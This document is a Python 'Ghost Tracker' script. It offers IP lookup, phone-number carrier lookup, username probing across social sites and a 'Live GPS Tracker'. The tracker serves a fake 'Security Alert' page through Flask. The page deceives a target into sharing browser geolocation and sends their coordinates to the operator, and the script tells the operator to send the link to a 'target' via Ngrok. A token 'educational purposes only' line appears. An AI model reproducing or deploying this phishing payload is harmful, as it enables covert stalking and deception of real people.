import json
import requests
import time
import os
import phonenumbers
from phonenumbers import carrier, geocoder
from sys import stderr
import socket
# NEW IMPORT FOR GPS TRACKING SERVER
try:
    from flask import Flask, request, jsonify, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# COLOR VARIABLES
Bl = '\033[30m'
Re = '\033[1;31m'
Gr = '\033[1;32m'
Ye = '\033[1;33m'
Blu = '\033[1;34m'
Mage = '\033[1;35m'
Cy = '\033[1;36m'
Wh = '\033[1;37m'
Reset = '\033[0m'

# GLOBAL VARIABLES FOR SERVER
app = None
TRACKING_DATA = []

# ==============================================================================
# GPS TRACKING SERVER LOGIC
# ==============================================================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Alert</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
        h1 { color: #d93025; font-size: 24px; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 16px; line-height: 1.5; margin-bottom: 20px; }
        .icon { font-size: 50px; color: #d93025; margin-bottom: 20px; display: block; }
        button { background-color: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
        button:hover { background-color: #0056b3; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <span class="icon">⚠️</span>
        <h1>Security Alert</h1>
        <p>Your device has detected suspicious activity. To protect your data, a mandatory security verification is required immediately.</p>
        <p>Click the button below to verify your location and secure your device.</p>
        <button onclick="getLocation()">Verify & Secure Device</button>
        <div class="footer">Protected by System Security Protocol</div>
    </div>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;
            fetch('/capture?lat=' + lat + '&lon=' + lon + '&acc=' + acc)
                .then(response => {
                    if (response.ok) { window.location.href = "https://www.google.com"; }
                    else { alert("Error verifying location."); }
                });
        }
        function showError(error) {
            alert("Location access denied. Verification failed.");
        }
    </script>
</body>
</html>
'''

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def start_server():
    global app
    app = Flask(__name__)
   
    @app.route('/')
    def index():
        ip = request.remote_addr
        print(f"\n{Gr}[!] NEW CONNECTION DETECTED!")
        print(f" Target IP: {ip}")
        print(f" Waiting for location permission...")
        return render_template_string(HTML_TEMPLATE)

    @app.route('/capture')
    def capture():
        lat = request.args.get('lat')
        lon = request.args.get('lon')
        acc = request.args.get('acc')
        ip = request.remote_addr
       
        if lat and lon:
            msg = f"""
{Gr}============================================================
[SUCCESS] GPS LOCATION CAPTURED!
Target IP: {ip}
Latitude: {lat}
Longitude: {lon}
Accuracy: {acc} meters
Google Maps: https://www.google.com/maps?q={lat},{lon}
============================================================{Reset}
"""
            print(msg)
            TRACKING_DATA.append(f"IP: {ip}, Lat: {lat}, Lon: {lon}")
            return jsonify({"status": "success"}), 200
        return jsonify({"status": "failed"}), 400

    print(f"\n{Ye}[!] WARNING: This server is for educational purposes only.")
    print(f"{Ye}[!] Do not use without consent.{Reset}")
    time.sleep(2)
    app.run(host='0.0.0.0', port=5000, threaded=True)

# ==============================================================================
# DECORATOR (MOVED UP - THIS FIXES THE ERROR)
# ==============================================================================
def is_option(func):
    def wrapper(*args, **kwargs):
        run_banner()
        func(*args, **kwargs)
    return wrapper

# ==============================================================================
# ORIGINAL FUNCTIONS
# ==============================================================================
def run_banner():
    clear()
    time.sleep(1)
    stderr.writelines(f"""{Wh}
         .-.
       .' `. {Wh}--------------------------------
       :g g : {Wh}| {Gr}GHOST - TRACKER - IP ADDRESS {Wh}|
       : o `. {Wh}| {Gr}@CODE BY Akram {AL}|
      : ``. {Wh}--------------------------------
     : `.
    : : . `.
    : : ` . `.
     `.. : `. ``;
        `:; `:'
           : `.
            `. `. .
              `'`'`'`---..,___`;.-'
        """)
    time.sleep(0.5)

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

@is_option
def live_gps_tracker():
    if not FLASK_AVAILABLE:
        print(f"\n{Re}[ERROR] Flask is not installed.")
        print(f"{Wh}Please install it first: {Gr}pip install flask{Reset}")
        input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue{Reset}')
        return

    print(f"\n{Wh}========== {Gr}LIVE GPS TRACKER {Wh}==========")
    print(f"{Wh}This feature creates a local server to capture real-time GPS.")
    print(f"{Wh}The target MUST click a link you send them and grant permission.")
    print(f"{Ye}\nWARNING: This only works if the target is on the same network OR if you use a tunneling service like Ngrok.{Reset}")
   
    choice = input(f"\n{Wh}[{Gr}1{Wh}] Start Server (Local IP)\n{Wh}[{Gr}2{Wh}] Back\n{Wh}Select: {Gr}")

    if choice == '1':
        local_ip = get_local_ip()
        print(f"\n{Gr}[+] Server started.")
        print(f"{Wh}Send this link to the target (if on same WiFi): {Gr}http://{local_ip}:5000{Reset}")
        print(f"\n{Ye}If the target is NOT on your WiFi, use Ngrok to expose this port.")
        print(f"{Wh}Press Ctrl+C to stop the server.{Reset}")
        try:
            start_server()
        except KeyboardInterrupt:
            print("\n\nServer stopped.")
    else:
        return

@is_option
def IP_Track():
    ip = input(f"{Wh}\n Enter IP target : {Gr}")
    print()
    print(f' {Wh}============= {Gr}SHOW INFORMATION IP ADDRESS {Wh}=============')
    try:
        req_api = requests.get(f"http://ipwho.is/{ip}")
        ip_data = json.loads(req_api.text)
        time.sleep(2)
        print(f"{Wh}\n IP target :{Gr}", ip)
        print(f"{Wh} Type :{Gr}", ip_data.get("type", "N/A"))
        print(f"{Wh} Country :{Gr}", ip_data.get("country", "N/A"))
        print(f"{Wh} City :{Gr}", ip_data.get("city", "N/A"))
        print(f"{Wh} ISP :{Gr}", ip_data.get("connection", {}).get("isp", "N/A"))
        print(f"\n{Ye}[NOTE] This shows registration info, NOT real-time location.")
        print(f"[NOTE] For real-time GPS, use Option 5 (Live GPS Tracker).{Reset}")
    except Exception as e:
        print(f"{Re}Error fetching IP data: {e}")

@is_option
def phoneGW():
    User_phone = input(f"\n {Wh}Enter phone number target {Gr}Ex [+1415xxxxxxx] {Wh}: {Gr}")
    if not User_phone.startswith('+'):
        User_phone = '+' + User_phone
    try:
        from phonenumbers import timezone
        parsed_number = phonenumbers.parse(User_phone, None)
        location = geocoder.description_for_number(parsed_number, "en")
        jenis_provider = carrier.name_for_number(parsed_number, "en")
        time_zones = timezone.time_zones_for_number(parsed_number)
        is_valid = phonenumbers.is_valid_number(parsed_number)
        print(f"\n {Wh}========== {Gr}SHOW INFORMATION PHONE NUMBERS {Wh}==========")
        print(f"\n {Wh}Location (Registered) :{Gr} {location}")
        print(f" {Wh}Operator :{Gr} {jenis_provider}")
        print(f" {Wh}Timezone(s) :{Gr} {', '.join(time_zones)}")
        print(f" {Wh}Valid Number :{Gr} {is_valid}")
        print(f"\n{Ye}[NOTE] This shows carrier registration info, NOT real-time GPS location.")
        print(f"[NOTE] Real-time phone tracking requires spyware or legal warrants.{Reset}")
    except Exception as e:
        print(f"{Re}Error: Invalid phone number format or could not parse. Make sure to include the country code.{Reset}")

@is_option
def TrackLu():
    username = input(f"\n {Wh}Enter Username : {Gr}")
    print(f"\n {Wh}========== {Gr}SHOW INFORMATION USERNAME {Wh}==========")
    print(f"{Ye}Checking social media presence for '{username}'...{Reset}\n")
    
    platforms = {
        "Instagram": f"https://www.instagram.com/{username}/",
        "Facebook": f"https://www.facebook.com/{username}",
        "Twitter/X": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "Pinterest": f"https://www.pinterest.com/{username}/"
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    for platform, url in platforms.items():
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                print(f"{Wh}[{Gr}+{Wh}] {platform}: {Gr}Found! {Wh}({url})")
            elif response.status_code == 404:
                print(f"{Wh}[{Re}-{Wh}] {platform}: {Re}Not Found")
            else:
                print(f"{Wh}[{Ye}?{Wh}] {platform}: {Ye}Blocked/Captcha (Status {response.status_code})")
        except requests.exceptions.RequestException:
            print(f"{Wh}[{Re}!{Wh}] {platform}: {Re}Error connecting")
    
    print(f"\n{Ye}[NOTE] Some sites (like Twitter or Instagram) may show False Positives/Negatives due to anti-bot protection.{Reset}")

@is_option
def showIP():
    try:
        respone = requests.get('https://api.ipify.org/')
        Show_IP = respone.text
        print(f"\n {Wh}========== {Gr}SHOW INFORMATION YOUR IP {Wh}==========")
        print(f"\n {Wh}[{Gr} + {Wh}] Your IP Address : {Gr}{Show_IP}")
        print(f"\n {Wh}==============================================")
    except:
        print(f"{Re}Failed to retrieve IP.")

# ==============================================================================
# MAIN MENU
# ==============================================================================
options = [
    {'num': 1, 'text': 'IP Tracker (Info Only)', 'func': IP_Track},
    {'num': 2, 'text': 'Show Your IP', 'func': showIP},
    {'num': 3, 'text': 'Phone Number Tracker (Info Only)', 'func': phoneGW},
    {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
    {'num': 5, 'text': 'Live GPS Tracker (NEW)', 'func': live_gps_tracker},
    {'num': 0, 'text': 'Exit', 'func': exit}
]

def call_option(opt):
    for option in options:
        if option['num'] == opt:
            if option['func'] == exit:
                print(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Exiting...{Reset}")
                exit()
            option['func']()
            return
    print(f"{Re}Option not found{Reset}")

def execute_option(opt):
    try:
        call_option(opt)
        input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue{Reset}')
        main()
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit{Reset}')
        exit()
    except Exception as e:
        print(f"{Re}Error: {e}")
        main()

def option_text():
    text = ''
    for opt in options:
        text += f'{Wh}[ {opt["num"]} ] {Gr}{opt["text"]}\n'
    return text

def option():
    clear()
    stderr.writelines(f"""
       ________ __ ______ __
      / ____/ /_ ____ _____/ /_ /_ __/________ ______/ /__
     / / __/ __ \/ __ \/ ___/ __/_____/ / / ___/ __ `/ ___/ //_/
    / /_/ / / / / /_/ (__ ) /_/_____/ / / / / /_/ / /__/ ,<
    \____/_/ /_/\____/____/\__/ /_/ /_/ \__,_/\___/_/|_|
              {Wh}[ + ] C O D E B Y H U N X [ + ]
    """)
    stderr.writelines(f"\n\n\n{option_text()}")

def main():
    clear()
    option()
    try:
        opt = int(input(f"{Wh}\n [ + ] {Gr}Select Option : {Wh}"))
        execute_option(opt)
    except ValueError:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Please input number{Reset}')
        time.sleep(2)
        main()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit{Reset}')
        exit()
